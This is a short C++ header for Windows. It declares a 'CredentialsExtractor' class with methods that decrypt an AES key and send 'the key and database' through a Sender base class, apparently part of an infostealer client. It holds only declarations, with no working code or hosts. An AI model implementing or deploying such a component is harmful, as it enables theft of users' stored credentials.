#ifndef CLIENT_CREDENTIALSEXTRACTOR_H
#define CLIENT_CREDENTIALSEXTRACTOR_H

#include "Base64.h"
#include "Sender.h"
#include <windows.h>
#include <vector>
#include <string>
#include <iostream>
#include "json.hpp"

class CredentialsExtractor : public Sender {
public:
    explicit CredentialsExtractor(const Stream &stream);

    std::vector<BYTE> decryptAESKey(const std::string& encryptedDataStr);
    std::vector<BYTE>  getDecryptedKey();
    void sendKeyAndDatabase();
    void send() override;
};


#endif
